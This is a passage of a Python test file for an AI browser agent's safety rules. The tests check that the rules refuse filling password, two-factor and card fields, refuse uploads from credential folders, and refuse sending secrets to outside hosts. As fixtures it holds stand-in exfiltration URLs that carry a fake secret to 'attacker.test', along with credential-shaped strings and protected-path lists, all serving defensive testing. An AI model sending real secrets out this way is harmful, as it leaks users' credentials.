"""The Browser's fixed action rules (BR-9a, amendment 1 §B.3–§B.4): pure.

Free and hermetic: no browser, no daemon, no model. HOME is a temp folder set
before Jarvis is imported, every config path follows it, `secrets`' own
checkout root is pointed at a temp folder, and the only `.env` read is a fake
one made here. `llm.chat` raises for the whole run: the rules never call a
model.

What it pins (§H's table for `browser_act_rules_check.py`, plus H3–H12 and
the review of PR #71):

  - **H1**: `type`, `select` and an editing `press` (Backspace, Delete,
    Space) are refused on `type=password`, on each `autocomplete` token
    (`current-password`, `new-password`, `one-time-code`, `webauthn`, every
    `cc-*` wherever it stands among the tokens), on the label heuristics
    (OTP, 2FA, MFA, TOTP, verification/security code, passcode, PIN, CVV,
    their joined spellings …), on four or more one-character boxes, on any
    field in a `PAYMENT_FRAME_HOSTS` frame and on a focused <iframe> showing
    one — clicking into one is not;
  - `press` refuses a printable character; Enter and Space are CLASSIFY; the
    navigation keys are CLASSIFY on or beside a sensitive field (autofill);
    Backspace and Delete are ALLOW only in a text field (a mail row, an
    option, a grid cell or a button is CLASSIFY);
  - a missing target: `type`/`select` refuse, an editing key or Enter asks;
  - **H2**: text, a navigate address, a clicked link or a submitted form's
    action that carries a value from the temp `.env` (raw, URL-encoded,
    base64) or a credential-pattern string is refused;
  - **H7's belt**: http(s) only, Jarvis's ports in a navigate address, a link
    or a form's action, an ambiguous host, userinfo, an address past 8 KB;
  - **H8**: every upload asks; `~/.ssh`, `~/.config/jarvis`, the gate's state,
    a credential env file, a hidden path (`.git`, `.GIT`, `.env.example`), a
    hard link, a symlink out, `..`, a folder, more than 50 MB are refused;
  - **the ASK floors**: login, sign-up, two-factor and payment submits, the
    URL shapes (path, fragment, route query), Chrome's own pages and
    executable links ask, with the right category;
  - **the ALLOW tier** needs no model; short typing in a POST form, or in a
    form beside a password field, is not allowed;
  - **H3–H7, H9–H12**: every state fact must be explicit — each one left
    unset, given the wrong type, a str, a negative number, NaN or infinity,
    refuses — and each refuses alone with its fixed sentence; an exception
    while judging refuses;
  - refusal reasons are fixed sentences, never page text;
  - a 1 MB label and a 100,000-character link are judged in well under
    100 ms.

Run: PYTHONPATH=. .venv/bin/python tests/v2/browser_act_rules_check.py
"""
from __future__ import annotations

import atexit
import base64
import os
from pathlib import Path
import shutil
import sys
import tempfile
import time
import unittest
from unittest.mock import patch
from urllib.parse import quote

# HOME first: `jarvis.config` reads it at import.
_ROOT = Path(tempfile.mkdtemp(prefix="br9a-rules-"))
atexit.register(shutil.rmtree, _ROOT, True)
os.environ["HOME"] = str(_ROOT / "home")
for _name in list(os.environ):
    if _name.startswith("JARVIS_") or _name in ("CODEX_HOME", "XDG_CONFIG_HOME", "XDG_DATA_HOME",
                                                "DOCKER_CONFIG", "KUBECONFIG", "NPM_CONFIG_USERCONFIG"):
        del os.environ[_name]
(_ROOT / "home").mkdir()

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from jarvis import config, llm  # noqa: E402
from jarvis.tools import secrets  # noqa: E402
from jarvis.v2.browser import act_rules as R  # noqa: E402
from jarvis.v2.browser.act_rules import Element, Facts, Form  # noqa: E402

# A value only the temp `.env` holds: no credential *pattern* matches it, so a
# refusal for it can only come from `secrets.secret_values()`.
ENV_VALUE = "Tr0ub4dor-staple-battery-9"
# Credential-shaped strings, built by concatenation so none sits in the file.
GITHUB_TOKEN = "gh" + "p_" + "A1b2C3d4" * 5
AWS_KEY = "AK" + "IA" + "ABCDEFGH12345678"

# Every state fact, set explicitly to the value that passes.
OK = dict(card_pending=False, paused=False, owner_has_input=True, owner_input_age_s=60.0,
          agents_may_drive=True, pane_can_drive=True, pane_can_see=True, private=False,
          tab_drawn=True, direct_mode=False, url_refused=False, other_driver=False,
          judged_this_turn=0, actions_this_hour=0, strict_profile=False, at_desk=True, depth=0,
          sub_agent=False)
REASONS = {value for name, value in vars(R).items() if name.startswith("R_")}


def facts(action: str, **kw) -> Facts:
    return Facts(action, **{**OK, **kw})


def field(**kw) -> Element:
    return Element(**{"tag": "input", "type": "text", **kw})


def _no_model(*_a, **_k):
    raise AssertionError("the rules called a model")


class World(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory(dir=_ROOT)
        self.addCleanup(tmp.cleanup)
        self.root = Path(tmp.name)
        self.home = Path(os.environ["HOME"])
        self.project = self.home / "proj"
        self.project.mkdir(exist_ok=True)
        self.addCleanup(shutil.rmtree, self.project, True)
        (self.project / ".env").write_text(f"API_KEY={ENV_VALUE}\n")
        checkout = self.root / "checkout"
        checkout.mkdir()
        for target, value in ((secrets, ("_JARVIS_ROOT", checkout)),
                              (llm, ("chat", _no_model))):
            guard = patch.object(target, *value)
            guard.start()
            self.addCleanup(guard.stop)
        here = os.getcwd()
        os.chdir(self.project)
        self.addCleanup(os.chdir, here)

    def judge(self, f, **kw) -> R.PreVerdict:
        verdict = R.pre_judge(f, **kw)
        if verdict.kind == R.REFUSE:
            self.assertIn(verdict.reason, REASONS)
        return verdict

    def assertRefused(self, f: Facts, rule: str, reason: str | None = None):
        verdict = self.judge(f)
        self.assertEqual((verdict.kind, verdict.rule), (R.REFUSE, rule), f"{f.action}: {verdict}")
        if reason is not None:
            self.assertEqual(verdict.reason, reason)
        return verdict

    def assertKind(self, f: Facts, kind: str, category: str = ""):
        verdict = self.judge(f)
        self.assertEqual((verdict.kind, verdict.category), (kind, category), verdict)
        return verdict


# -- H1 ------------------------------------------------------------------------------------------

AUTOCOMPLETE_SENSITIVE = ["current-password", "new-password", "one-time-code", "webauthn",
                          "cc-number", "cc-csc", "cc-exp", "cc-exp-month", "cc-exp-year",
                          "cc-name", "cc-given-name", "cc-additional-name", "cc-type",
                          "billing cc-number", "section-pay shipping cc-csc", "username webauthn",
                          "  CC-Number  "]
LABEL_SENSITIVE = [dict(attr_name="otp"), dict(attr_id="otpCode"), dict(attr_id="otp1"),
                   dict(placeholder="Enter your one-time code"), dict(aria_label="2FA code"),
                   dict(attr_name="2fa_code"), dict(label="Verification code"),
                   dict(attr_name="mfa_token"), dict(label="TOTP"), dict(name="Security code"),
                   dict(placeholder="Passcode"), dict(label="PIN"), dict(label="CVV"),
                   dict(attr_name="cvc"), dict(aria_label="CSC"), dict(label="Card number"),
                   dict(attr_id="cardNumber"), dict(label="Expiration date"),
                   dict(placeholder="Expiry (MM/YY)"), dict(label="Password"),
                   dict(label="pass\u200bword"), dict(label="\uff2f\uff34\uff30"),  # ＯＴＰ
                   dict(label="Code", inputmode="numeric", maxlength=6),
                   dict(label="Enter the code", type="tel", maxlength=8),
                   # The joined spellings (review of PR #71, NIT).
                   dict(attr_name="otpcode"), dict(attr_id="cardnum"), dict(attr_name="creditcard"),
                   dict(attr_id="securitycode"), dict(attr_name="cardcvc"), dict(attr_id="expdate"),
                   dict(attr_name="smscode"), dict(label="SMS code")]
LABEL_ORDINARY = [dict(label="Search"), dict(label="Email address"), dict(label="Shipping address"),
                  dict(placeholder="Topic"), dict(attr_name="username"), dict(label="Spinner speed"),
                  dict(label="ZIP code", inputmode="numeric", maxlength=5),
                  dict(label="Promo code", inputmode="numeric", maxlength=6),
                  dict(label="Code", inputmode="numeric", maxlength=12),
                  dict(label="Code"), dict(attr_id="option1"), dict(label="Pinned notes")]
PAYMENT_FRAMES = ["https://js.stripe.com", "https://m.stripe.network", "https://assets.braintreegateway.com",
                  "https://checkoutshopper-live.adyen.com", "https://www.paypal.com",
                  "https://web.squarecdn.com"]


class SensitiveFields(World):
    """H1: Jarvis never fills a password, one-time-code or card field."""

    def fills(self, el: Element):
        yield facts("type", text="hello", target=el)
        yield facts("select", text="March", target=el)
        for key in ("Backspace", "Delete", "Space"):
            yield facts("press", key=key, target=el)

    def assertNeverFilled(self, el: Element, click: str = R.CLASSIFY):
        for f in self.fills(el):
            self.assertRefused(f, "H1", R.R_SENSITIVE)
        # Clicking into it is allowed (not refused); the rules leave it to the reviewer.
        self.assertEqual(self.judge(facts("click", target=el)).kind, click)
        # A navigation key is not a fill — but with autofill on it can accept
        # a saved card, so it is the reviewer's, never ALLOW.
        for key in ("Tab", "ArrowDown", "Escape", "End"):
            self.assertEqual(self.judge(facts("press", key=key, target=el)).kind, R.CLASSIFY, key)

    def test_type_password(self):
        self.assertNeverFilled(field(type="password"))
        self.assertNeverFilled(field(type=" PassWord "))

    def test_every_autocomplete_token_alone(self):
        # Nothing but the autocomplete attribute marks these fields.
        for token in AUTOCOMPLETE_SENSITIVE:
            with self.subTest(token=token):
                self.assertNeverFilled(field(autocomplete=token))

    def test_every_cc_token_wherever_it_stands(self):
        for token in ("cc-number", "cc-csc", "cc-exp", "cc-type", "cc-whatever-next"):
            for spelling in (token, f"billing {token}", f"section-a shipping {token} webauthn",
                             f"\t{token}\n"):
                with self.subTest(spelling=spelling):
                    self.assertEqual(R.sensitive_kind(field(autocomplete=spelling)), R.CARD)

    def test_label_heuristics(self):
        for attrs in LABEL_SENSITIVE:
            with self.subTest(attrs=attrs):
                self.assertNeverFilled(field(**attrs))

    def test_ordinary_labels_are_not_sensitive(self):
        for attrs in LABEL_ORDINARY:
            with self.subTest(attrs=attrs):
                el = field(**attrs)
                self.assertIsNone(R.sensitive_kind(el))
                self.assertNotEqual(self.judge(facts("type", text="hello", target=el)).kind, R.REFUSE)

    def test_split_one_character_boxes(self):
        self.assertNeverFilled(field(maxlength=1, single_char_siblings=6))
        self.assertNeverFilled(field(maxlength=1, single_char_siblings=4))
        self.assertIsNone(R.sensitive_kind(field(maxlength=1, single_char_siblings=3)))
        # And a form of six one-character boxes is a two-factor form.
        boxes = tuple(field(maxlength=1) for _ in range(6))
        self.assertIn(R.OTP, R.form_kinds(Form("post", fields=boxes)))

    def test_a_field_in_a_payment_frame(self):
        for origin in PAYMENT_FRAMES:
            with self.subTest(origin=origin):
                # An innocent-looking field: only its frame says what it is.
                self.assertNeverFilled(field(label="Name", frame_origin=origin))
        for origin in ("https://example.com", "https://notstripe.com", "https://stripe.com.evil.test", ""):
            with self.subTest(origin=origin):
                self.assertIsNone(R.sensitive_kind(field(label="Name", frame_origin=origin)))

    def test_a_focused_payment_iframe(self):
        frame = Element(tag="iframe", src="https://js.stripe.com/v3/elements-inner-card.html")
        self.assertEqual(R.sensitive_kind(frame), R.CARD)
        # Not a text field, so a click on it is the payment floor's.
        self.assertNeverFilled(frame, click=R.ASK)
        other = Element(tag="iframe", src="https://www.youtube.com/embed/x")
        self.assertIsNone(R.sensitive_kind(other))
        # Keys go into a frame whose focused field the rules cannot see.
        self.assertKind(facts("press", key="Tab", target=other), R.CLASSIFY)
        self.assertKind(facts("press", key="Backspace", target=other), R.CLASSIFY)

    def test_a_sensitive_select(self):
        select = Element(tag="select", autocomplete="cc-exp-month")
        self.assertRefused(facts("select", text="03", target=select), "H1")

    def test_the_classifier_is_not_reached(self):
        # The refusal is the rules' own: no model, no CLASSIFY on the way.
        with patch.object(llm, "chat", _no_model):
            self.assertRefused(facts("type", text="x", target=field(type="password")), "H1")

    def test_a_long_identifier_fails_closed(self):
        self.assertIsNotNone(R.sensitive_kind(field(attr_id="a" * (R.IDENT_CAP + 1))))


# -- press ----------------------------------------------------------------------------------------

class Keys(World):
    def test_a_printable_key_is_refused(self):
        for key in ("a", "A", "1", " ", "/", "é", "Ctrl+A", "Enter Enter", "aa", "", "\n", "Key"):
            with self.subTest(key=key):
                self.assertRefused(facts("press", key=key, target=field()), "action", R.R_KEY)

    def test_enter_and_space_are_classify_not_allow(self):
        for key in ("Enter", "enter", "Return", "Space", "space"):
            with self.subTest(key=key):
                self.assertKind(facts("press", key=key, target=field()), R.CLASSIFY)
        self.assertNotIn("Enter", R.NAV_KEYS)
        self.assertNotIn("Space", R.NAV_KEYS)

    def test_the_navigation_keys_are_allowed_away_from_sensitive_fields(self):
        for key in sorted(R.NAV_KEYS) + ["esc", "up", "Shift-Tab", "PGDN"]:
            with self.subTest(key=key):
                self.assertKind(facts("press", key=key, target=field()), R.ALLOW)
                self.assertKind(facts("press", key=key, target=Element(tag="body")), R.ALLOW)

    def test_navigation_keys_on_or_beside_a_sensitive_field(self):
        # With autofill on, ArrowDown and Tab in a card field accept a saved card.
        login = Form("post", "https://x.test/s", fields=(field(attr_name="user"), field(type="password")))
        card = Form("post", "https://x.test/o", fields=(field(attr_name="name"),),
                    frame_origins=("https://js.stripe.com",))
        for key in ("ArrowDown", "ArrowUp", "Tab", "Shift+Tab", "Escape", "PageDown", "Home", "End"):
            with self.subTest(key=key):
                self.assertKind(facts("press", key=key, target=field(autocomplete="cc-number")), R.CLASSIFY)
                self.assertKind(facts("press", key=key, target=field(attr_name="user"), form=login),
                                R.CLASSIFY)
                self.assertKind(facts("press", key=key, target=field(attr_name="name"), form=card),
                                R.CLASSIFY)
                self.assertKind(facts("press", key=key), R.CLASSIFY)  # no target named

    def test_editing_keys_only_in_a_text_field(self):
        for key in ("Backspace", "Delete", "del"):
            with self.subTest(key=key):
                for el in (field(label="Search"), Element(tag="textarea"), Element(tag="div", editable=True),
                           Element(tag="div", role="textbox"), field(type="email")):
                    self.assertKind(facts("press", key=key, target=el), R.ALLOW)
                # On a mail row, a file, a grid cell or a button, Delete deletes the selection.
                for el in (Element(tag="tr", role="row", name="Invoice from ACME"),
                           Element(tag="li", role="option", name="report.pdf"),
                           Element(tag="td", role="gridcell", name="Q3 budget"),
                           Element(tag="button", name="Archive"), Element(tag="div", role="listitem"),
                           Element(tag="body"), field(type="checkbox")):
                    self.assertKind(facts("press", key=key, target=el), R.CLASSIFY)

    def test_with_no_target_named(self):
        # type and select need a ref; an editing key or Enter asks.
        self.assertRefused(facts("type", text="hi"), "action", R.R_NO_TARGET)
        self.assertRefused(facts("select", text="Blue"), "action", R.R_NO_TARGET)
        for key in ("Backspace", "Delete", "Space", "Enter"):
            with self.subTest(key=key):
                self.assertKind(facts("press", key=key), R.ASK, R.NO_TARGET)


# -- H2 --------------------------------------------------------------------------------------------

class Credentials(World):
    """H2: nothing the agent types or sends carries a credential."""

    def test_the_fixture_value_is_only_known_from_the_env_file(self):
        from jarvis import credential_patterns
        self.assertFalse(credential_patterns.holds_credential(ENV_VALUE))
        self.assertIn(ENV_VALUE, secrets.secret_values())

    def test_text_carrying_an_env_value(self):
        for text in (ENV_VALUE, f"my key is {ENV_VALUE} ok",
                     base64.b64encode(f"x:{ENV_VALUE}".encode()).decode(),
                     quote(ENV_VALUE, safe=""), ENV_VALUE[:5] + "\u200b" + ENV_VALUE[5:]):
            with self.subTest(text=text):
                self.assertRefused(facts("type", text=text, target=field(label="Comment")), "H2",
                                   R.R_CREDENTIAL)

    def test_a_navigate_address_carrying_an_env_value(self):
        for url in (f"https://attacker.test/?k={ENV_VALUE}",
                    f"https://attacker.test/{quote(ENV_VALUE, safe='')}",
                    "https://attacker.test/?k=" + "".join(f"%{ord(c):02X}" for c in ENV_VALUE),
                    "https://attacker.test/?k=" + base64.b64encode(ENV_VALUE.encode()).decode()):
            with self.subTest(url=url):
                self.assertRefused(facts("navigate", nav_url=url), "H2", R.R_CREDENTIAL)

    def test_credential_pattern_strings(self):
        for secret in (GITHUB_TOKEN, AWS_KEY):
            with self.subTest(secret=secret[:6]):
                self.assertRefused(facts("type", text=f"token {secret}", target=field()), "H2")
                self.assertRefused(facts("navigate", nav_url=f"https://x.test/?t={secret}"), "H2")
                self.assertRefused(facts("select", text=secret, target=Element(tag="select")), "H2")

    def test_a_clicked_link_or_submitted_form_carrying_one(self):
        link = Element(tag="a", href=f"https://attacker.test/?k={ENV_VALUE}")
        self.assertRefused(facts("click", target=link), "H2")
        form = Form("get", action=f"https://attacker.test/{GITHUB_TOKEN}")
        button = Element(tag="button", submits=True)
        self.assertRefused(facts("click", target=button, form=form), "H2")
        self.assertRefused(facts("press", key="Space", target=button, form=form), "H2")
        self.assertRefused(facts("press", key="Enter", target=field(), form=form), "H2")

    def test_values_the_caller_adds(self):
        extra = "another-Project-value-77"
        f = facts("type", text=f"x {extra}", target=field())
        self.assertNotEqual(self.judge(f).kind, R.REFUSE)
        self.assertEqual(self.judge(f, extra_values=[extra]).rule, "H2")

    def test_ordinary_text_passes(self):
        self.assertNotEqual(self.judge(facts("type", text="weather in Boston", target=field())).kind,
                            R.REFUSE)
        self.assertNotEqual(self.judge(facts("navigate", nav_url="https://example.com/a?q=b")).kind,
                            R.REFUSE)


# -- H8 ---------------------------------------------------------------------------------------------

class Uploads(World):
    def upload(self, path: str, project: Path | None = None) -> R.PreVerdict:
        target = Element(tag="input", type="file")
        return self.judge(facts("upload", target=target, upload_path=path,
                                project_dir=str(project or self.project)))

    def test_every_upload_asks(self):
        (self.project / "photo.png").write_bytes(b"\x89PNG")
        (self.project / "docs").mkdir()
        (self.project / "docs" / "cv.pdf").write_bytes(b"%PDF")
        (self.project / ".well-known").mkdir()
        (self.project / ".well-known" / "security.txt").write_text("x")
        for name in ("photo.png", "docs/cv.pdf", str(self.project / "photo.png"),
                     ".well-known/security.txt"):
            with self.subTest(name=name):
                verdict = self.upload(name)
                self.assertEqual((verdict.kind, verdict.category), (R.ASK, R.UPLOAD))
                self.assertTrue(Path(verdict.path).is_file())

    def test_the_path_asked_about_is_the_resolved_one(self):
        (self.project / "real.txt").write_text("x")
        (self.project / "alias.txt").symlink_to(self.project / "real.txt")
        self.assertEqual(self.upload("alias.txt").path, str((self.project / "real.txt").resolve()))

    def test_credential_folders_and_gate_state_in_the_inbox(self):
        # The Inbox is rooted at home: these sit inside the "project".
        home = self.home
        (home / ".ssh").mkdir(exist_ok=True)
        (home / ".ssh" / "id_test").write_text("fake key\n")
        (home / ".config" / "jarvis").mkdir(parents=True, exist_ok=True)
        (home / ".config" / "jarvis" / "notes.txt").write_text("x")
        (home / ".config" / "jarvis" / "allowlist.json").write_text("[]")
        (home / ".local" / "share" / "jarvis" / "sessions").mkdir(parents=True, exist_ok=True)
        (home / ".local" / "share" / "jarvis" / "sessions" / "log.jsonl").write_text("{}")
        for name in (".ssh/id_test", ".config/jarvis/notes.txt", ".config/jarvis/allowlist.json",
                     ".local/share/jarvis/sessions/log.jsonl"):
            with self.subTest(name=name):
                verdict = self.upload(name, project=home)
                self.assertEqual((verdict.kind, verdict.rule), (R.REFUSE, "H8"))
                self.assertEqual(verdict.reason, R.R_UPLOAD_PROTECTED)

    def test_protected_state_wherever_it_lives(self):
        routing = self.project / "routing.json"
        routing.write_text("{}")
        with patch.object(config, "ROUTING_PATH", routing):
            self.assertEqual(self.upload("routing.json").reason, R.R_UPLOAD_PROTECTED)
        self.assertEqual(self.upload("routing.json").kind, R.ASK)

    def test_credential_files(self):
        (self.project / ".env.production").write_text("X=1\n")
        (self.project / "google_token.json").write_text("{}")
        (self.project / "innocent.txt").symlink_to(self.project / ".env")
        for name in (".env", ".env.production", "google_token.json", "innocent.txt"):
            with self.subTest(name=name):
                self.assertEqual(self.upload(name).reason, R.R_UPLOAD_PROTECTED)

    def test_hidden_paths(self):
        # The preview origin's rule (`hud_api._not_a_page`), called: any hidden
        # component but `.well-known`, in any case.
        for folder in (".git", ".GIT", ".Git", ".github", ".docker", ".hidden"):
            (self.project / folder).mkdir()
            (self.project / folder / "config").write_text("[remote]\n")
        (self.project / ".env.example").write_text("API_KEY=\n")
        (self.project / ".bashrc").write_text("x")
        for name in (".git/config", ".GIT/config", ".Git/config", ".github/config", ".docker/config",
                     ".hidden/config", ".env.example", ".bashrc"):
            with self.subTest(name=name):
                self.assertEqual(self.upload(name).reason, R.R_UPLOAD_HIDDEN)

    def test_a_hard_link(self):
        (self.project / "a.txt").write_text("x")
        os.link(self.project / "a.txt", self.project / "b.txt")
        self.assertEqual(self.upload("b.txt").reason, R.R_UPLOAD_LINKED)
        self.assertEqual(self.upload("a.txt").reason, R.R_UPLOAD_LINKED)

    def test_outside_the_project(self):
        outside = self.root / "elsewhere.txt"
        outside.write_text("x")
        (self.project / "link.txt").symlink_to(outside)
        (self.project / "dirlink").symlink_to(self.root)
        for name in (str(outside), "../" + os.path.relpath(outside, self.project.parent),
                     "link.txt", "dirlink/elsewhere.txt", "~/../" + outside.name, ".", ""):
            with self.subTest(name=name):
                verdict = self.upload(name)
                self.assertEqual(verdict.rule, "H8")
                self.assertIn(verdict.reason, (R.R_UPLOAD_OUTSIDE, R.R_UPLOAD_NONE))
        self.assertEqual(self.judge(facts("upload", upload_path="a.txt", project_dir="")).reason,
                         R.R_UPLOAD_NONE)

    def test_size_and_kind(self):
        big = self.project / "big.bin"
        with open(big, "wb") as handle:  # sparse: no real 50 MB on disk
            handle.truncate(R.MAX_UPLOAD_BYTES + 1)
        self.assertEqual(self.upload("big.bin").reason, R.R_UPLOAD_SIZE)
        edge = self.project / "edge.bin"
        with open(edge, "wb") as handle:
            handle.truncate(R.MAX_UPLOAD_BYTES)
        self.assertEqual(self.upload("edge.bin").kind, R.ASK)
        (self.project / "folder").mkdir()
        self.assertEqual(self.upload("folder").reason, R.R_UPLOAD_NOT_FILE)
        self.assertEqual(self.upload("missing.txt").reason, R.R_UPLOAD_NOT_FILE)
        os.mkfifo(self.project / "pipe")
        self.assertEqual(self.upload("pipe").reason, R.R_UPLOAD_NOT_FILE)


# -- the ASK floors -------------------------------------------------------------------------------

LOGIN_FORM = Form("post", "https://site.test/session",
                  fields=(field(attr_name="user"), field(type="password", attr_name="pw")))
SIGNUP_FORM = Form("post", "https://site.test/users",
                   fields=(field(attr_name="email"), field(type="password", autocomplete="new-password")))
OTP_FORM = Form("post", "https://site.test/verify", fields=(field(autocomplete="one-time-code"),))
BOXES_FORM = Form("post", "https://site.test/verify", fields=tuple(field(maxlength=1) for _ in range(6)))
CARD_FORM = Form("post", "https://shop.test/order",
                 fields=(field(attr_name="name"), field(autocomplete="cc-number")))
STRIPE_FORM = Form("post", "https://shop.test/order", fields=(field(attr_name="name"),),
                   frame_origins=("https://js.stripe.com",))
SUBMIT = Element(tag="button", type="submit", name="Continue", submits=True)
SHOW = Element(tag="button", type="button", name="Show password")

URL_FLOORS = [
    ("https://example.com/login", R.LOGIN), ("https://example.com/en/Login.php", R.LOGIN),
    ("https://example.com/LOGIN", R.LOGIN), ("https://example.com/users/sign_in", R.LOGIN),
    ("https://example.com/signin?next=/", R.LOGIN),
    ("https://example.com/oauth/authorize?client_id=1", R.OAUTH),
    ("https://example.com/o/oauth2/v2/auth", R.OAUTH), ("https://example.com/consent", R.OAUTH),
    ("https://sso.test/realms/main/protocol/openid-connect/auth?x=1", R.OAUTH),
    ("https://example.com/signup", R.SIGNUP), ("https://example.com/register", R.SIGNUP),
    ("https://shop.test/cart/checkout", R.PURCHASE), ("https://shop.test/pay", R.PAYMENT),
    ("https://www.amazon.test/gp/buy/spc/handlers/display.html", R.PURCHASE),
    ("https://example.com/settings/billing", R.PAYMENT),
    ("https://example.com/settings/security", R.ACCOUNT_SECURITY),
    ("https://example.com/account/delete", R.DELETE),
    ("https://blog.test/wp-login.php", R.LOGIN), ("https://blog.test/wp-login.php?action=register", R.LOGIN),
    ("https://app.test/session/new", R.LOGIN),
    # The route in the fragment and the query (review of PR #71).
    ("https://app.test/#/login", R.LOGIN), ("https://app.test/#!/checkout/step1", R.PURCHASE),
    ("https://app.test/index.html#/settings/security?tab=2", R.ACCOUNT_SECURITY),
    ("https://shop.test/index.php?route=checkout/cart", R.PURCHASE),
    ("https://shop.test/index.php?route=account%2Flogin", R.LOGIN),
    ("https://shop.test/index.php?login", R.LOGIN), ("https://shop.test/?page=Register", R.SIGNUP),
    ("https://accounts.google.com/v3/signin/identifier", R.LOGIN),
    ("https://accounts.google.com/", R.LOGIN),
    ("https://login.microsoftonline.com/common/x", R.LOGIN),
    ("https://appleid.apple.com/", R.LOGIN), ("https://github.com/login", R.LOGIN),
    ("https://github.com/sessions/two-factor", R.LOGIN),
    ("https://checkout.stripe.com/c/pay/cs_x", R.PAYMENT),
    ("https://www.paypal.com/checkoutnow?token=1", R.PAYMENT),
    ("https://www.paypal.com/checkout/x", R.PAYMENT),
    ("https://example.com/%6C%6F%67%69%6E", R.LOGIN), ("https://example.com/%4C%4F%47%49%4E", R.LOGIN),
    ("chrome://settings/syncSetup", R.ACCOUNT_SECURITY),
]
URL_ORDINARY = ["https://example.com/blog/how-to-login-faster", "https://example.com/loginsight",
                "https://example.com/paypal-guide", "https://example.com/?next=/login",
                "https://www.google.com/search?q=login", "https://example.com/docs#section-login-tips",
                "https://example.com/docs/payment-history-explained",
                "https://news.google.com/", "https://github.com/anthropics"]
EXECUTABLES = ["https://dl.test/setup.exe", "https://dl.test/x/Tool.AppImage", "https://dl.test/i.sh",
               "https://dl.test/a.MSI", "https://dl.test/pkg/app.dmg", "https://dl.test/a.apk",
               "https://dl.test/app.jar?v=1", "https://dl.test/%73etup.exe",
               "https://dl.test/setup.exe.", "https://dl.test/setup.exe;jsessionid=1",
               "https://dl.test/setup.exe%20", "https://dl.test/setup.exe/",
               "https://dl.test/a.hta", "https://dl.test/a.lnk", "https://dl.test/a.iso",
               "https://dl.test/a.reg", "https://dl.test/a.msp", "https://dl.test/a.application"]


class Floors(World):
    def test_login_signup_two_factor_and_payment_submits(self):
        for form, category in ((LOGIN_FORM, R.LOGIN), (SIGNUP_FORM, R.SIGNUP), (OTP_FORM, R.TWO_FACTOR),
                               (BOXES_FORM, R.TWO_FACTOR), (CARD_FORM, R.PAYMENT),
                               (STRIPE_FORM, R.PAYMENT)):
            with self.subTest(form=form.action, category=category):
                self.assertKind(facts("click", target=SUBMIT, form=form), R.ASK, category)
                self.assertKind(facts("press", key="Space", target=SUBMIT, form=form), R.ASK, category)
                self.assertKind(facts("press", key="Enter", target=form.fields[0], form=form),
                                R.ASK, category)
                # Any button in it, not only the submit: a script may submit.
                self.assertKind(facts("click", target=SHOW, form=form), R.ASK, category)
                # Anything that submits it, whatever its role.
                odd = Element(tag="div", role="textbox", submits=True)
                self.assertKind(facts("click", target=odd, form=form), R.ASK, category)
                self.assertKind(facts("press", key="Space", target=odd, form=form), R.ASK, category)
                # Clicking into a field only focuses it: the reviewer's.
                self.assertKind(facts("click", target=field(attr_name="email"), form=form), R.CLASSIFY)

    def test_enter_in_a_password_field_with_no_form(self):
        self.assertKind(facts("press", key="Enter", target=field(type="password")), R.ASK, R.LOGIN)

    def test_url_shapes_navigated_to_or_clicked(self):
        for url, category in URL_FLOORS:
            with self.subTest(url=url):
                self.assertKind(facts("navigate", nav_url=url), R.ASK, category)
                self.assertKind(facts("click", target=Element(tag="a", href=url)), R.ASK, category)

    def test_a_submitted_form_landing_on_one(self):
        form = Form("post", "https://example.com/oauth/authorize", fields=(field(attr_name="scope"),))
        self.assertKind(facts("click", target=SUBMIT, form=form), R.ASK, R.OAUTH)

    def test_ordinary_addresses_are_the_reviewers(self):
        for url in URL_ORDINARY:
            with self.subTest(url=url):
                self.assertKind(facts("navigate", nav_url=url), R.CLASSIFY)
                self.assertKind(facts("click", target=Element(tag="a", href=url)), R.CLASSIFY)

    def test_executable_links(self):
        for url in EXECUTABLES:
            with self.subTest(url=url):
                self.assertKind(facts("click", target=Element(tag="a", href=url)), R.ASK,
                                R.EXECUTABLE_DOWNLOAD)
                self.assertKind(facts("navigate", nav_url=url), R.ASK, R.EXECUTABLE_DOWNLOAD)
        for url in ("https://dl.test/?f=setup.exe", "https://dl.test/exe", "https://dl.test/a.exe.html"):
            with self.subTest(url=url):
                self.assertKind(facts("click", target=Element(tag="a", href=url)), R.CLASSIFY)

    def test_executable_downloads(self):
        for name, mime in (("setup.exe", ""), ("Tool.AppImage", ""), ("run.SH", ""),
                           ("C:\\Users\\x\\Downloads\\a.msi", ""), ("x.bin", "application/x-msdownload"),
                           ("archive", "application/vnd.android.package-archive; charset=binary"),
                           ("setup.exe.", ""), ("setup.exe%20", ""), ("setup.exe;x=1", ""),
                           ("page.hta", ""), ("disk.ISO", ""), ("x", "application/hta")):
            with self.subTest(name=name):
                self.assertTrue(R.executable_download(name, mime))
        for name, mime in (("report.pdf", "application/pdf"), ("photo.png", ""), ("", "")):
            self.assertFalse(R.executable_download(name, mime))

    def test_the_floors_are_asks_even_under_the_budget(self):
        self.assertKind(facts("navigate", nav_url="https://x.test/login", judged_this_turn=39), R.ASK, R.LOGIN)
        self.assertRefused(facts("navigate", nav_url="https://x.test/login", judged_this_turn=40),
                           "H10", R.R_BUDGET_TURN)


# -- the ALLOW tier -----------------------------------------------------------------------------------

class AllowTier(World):
    def test_allowed_with_no_model(self):
        cases = [facts("scroll", text=d) for d in ("", "up", "down", "top", "bottom")] + [
            facts("back"), facts("forward"),
            facts("press", key="PageDown", target=field()),
            facts("press", key="Backspace", target=field(label="Search")),
            facts("type", text="weather in Boston", target=field(type="search")),
            facts("type", text="x" * 64, target=Element(tag="input", role="searchbox")),
            facts("type", text="flights", target=field(attr_name="q"), form=Form("GET", "https://x.test/s")),
            facts("type", text="", target=field(type="search")),
        ]
        with patch.object(llm, "chat", _no_model):
            for f in cases:
                with self.subTest(action=f.action, text=f.text[:10]):
                    self.assertEqual(self.judge(f).kind, R.ALLOW)

    def test_short_typing_is_not_allowed_in_a_post_form_or_beside_a_password(self):
        user = field(attr_name="q")
        for form in (Form("post", "https://x.test/s", fields=(user,)),
                     Form("dialog", "", fields=(user,)),
                     Form("", "https://x.test/s", fields=(user,)),
                     Form("get", "https://x.test/s", fields=(user, field(type="password"))),
                     Form("get", "https://x.test/s", fields=(user, field(autocomplete="cc-number"))),
                     Form("get", "https://x.test/s", fields=(user,), frame_origins=("https://js.stripe.com",))):
            with self.subTest(method=form.method, fields=len(form.fields)):
                self.assertKind(facts("type", text="hi", target=user, form=form), R.CLASSIFY)
        # Even a search field, beside a password field.
        search = field(type="search")
        self.assertKind(facts("type", text="hi", target=search,
                              form=Form("get", "", fields=(search, field(type="password")))), R.CLASSIFY)

    def test_beyond_the_short_search(self):
